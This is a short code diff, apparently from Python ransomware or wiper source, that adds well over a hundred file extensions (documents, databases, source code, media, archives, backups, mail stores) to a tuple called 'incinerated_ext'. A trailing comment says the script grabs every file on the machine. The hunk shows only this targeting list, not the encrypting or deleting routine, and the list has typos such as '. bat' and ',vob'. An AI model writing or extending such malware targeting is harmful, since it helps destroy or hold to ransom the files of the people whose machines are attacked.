@@ -16,7 +16,25 @@ incinerated_ext = ('.txt', '.png', '.jpg', '.jpeg', '.der',
                    'std', '.uop', '.odg', '.otg', '.sxm',
                    '.mml', '.lay', '.lay6', '.asc', '.sqlite3',
                    '.sqlitedb', '.sql', '.accdb', '.mdb', '.dfb',
-                   '.odb', '.frm', '.myd', '.myi')
+                   '.odb', '.frm', '.myd', '.myi', '.ibd', '.mdf',
+                   '.ldf', '.sln', '.suo', '.cpp', '.pas', '.asm',
+                   '.cmd', '. bat', '.vbs', '.dip', '.dch', '.sch',
+                   '.brd', '.jsp', '.php', '.asp', '.java', '.jar',
+                   '.class', '.wav', '.swf', '.fla', '.wmv', '.mpg',
+                   ',vob', '.mpeg', '.asf', '.avi', '.mov', '.mkv',
+                   '.flv', '.wma', '.mid', '.djvu', '.svg', '.psd',
+                   '.nef', '.tiff', '.tif', '.cgm', '.raw', '.gif',
+                   '.bmp', '.vcd', '.iso', '.backup', '.zip', '.rar',
+                   '.tgz', '.tar', '.bak', '.tbk', '.paq', '.arc',
+                   '.aes', '.gpg', '.wmx', '.wmdk', '.vdi', '.sldm',
+                   '.sldx', '.sti', '.sxi', '.hwp', '.snt', '.onetoc2',
+                   '.dwg', '.pdf', '.wks', '.rtf', '.csv', '.vsdx',
+                   '.vsd', '.edb', '.eml', '.msg', '.ost', '.pst',
+                   '.potm', '.potx', '.ppam', '.ppsx', '.ppsm', '.pps',
+                   '.pot', '.pptm', '.pptx', '.ppt', '.xltm', '.xltx',
+                   '.xlc', '.xlm', '.xlt', '.xlw', '.xlsb', '.xlsm', '.xlsx',
+                   '.xls', '.dotx', '.dotm', '.dot', '.docm', '.docb', '.docx',
+                   '.doc')
 
 # Grab all file from the machine
 file_paths = []
